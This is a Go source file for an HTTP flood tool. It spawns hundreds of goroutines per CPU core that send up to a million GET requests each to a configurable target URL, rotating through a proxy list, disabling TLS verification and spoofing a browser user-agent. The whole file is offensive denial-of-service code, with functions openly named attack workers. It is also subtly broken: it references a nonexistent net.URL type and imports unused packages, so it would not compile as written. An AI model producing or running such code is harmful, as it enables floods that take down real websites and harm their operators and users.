package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"runtime"
	"golang.org/x/net/http2"
)

const (
	TargetURL      = "https://example.com" // Change this
	ThreadsPerCore = 500
	RequestPerConn = 1000000
	ProxyFile      = "proxy.txt"
)

var (
	proxies     []string
	requestsSent uint64
	client      *http.Client
)

// Load proxies from file
func loadProxies() {
	file, err := os.Open(ProxyFile)
	if err != nil {
		fmt.Println("No proxy file found, using direct connections.")
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}
}

// Create HTTP/2 compatible client
func createClient(proxy string) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	if proxy != "" {
		transport.Proxy = http.ProxyURL(&net.URL{Host: proxy})
	}

	http2.ConfigureTransport(transport)
	return &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
	}
}

func attackWorker(wg *sync.WaitGroup) {
	defer wg.Done()

	proxy := ""
	if len(proxies) > 0 {
		proxy = proxies[int(time.Now().UnixNano())%len(proxies)]
	}

	client := createClient(proxy)

	for i := 0; i < RequestPerConn; i++ {
		req, err := http.NewRequest("GET", TargetURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
		req.Header.Set("Connection", "keep-alive")

		resp, err := client.Do(req)
		if err == nil {
			resp.Body.Close()
			atomic.AddUint64(&requestsSent, 1)
		}
	}
}

func main() {
	loadProxies()
	runtime.GOMAXPROCS(runtime.NumCPU())

	var wg sync.WaitGroup

	// Start attack workers
	for i := 0; i < runtime.NumCPU()*ThreadsPerCore; i++ {
		wg.Add(1)
		go attackWorker(&wg)
	}

	// Display request count every second
	go func() {
		for {
			time.Sleep(1 * time.Second)
			fmt.Printf("Requests sent: %d\n", atomic.LoadUint64(&requestsSent))
		}
	}()

	wg.Wait()
}
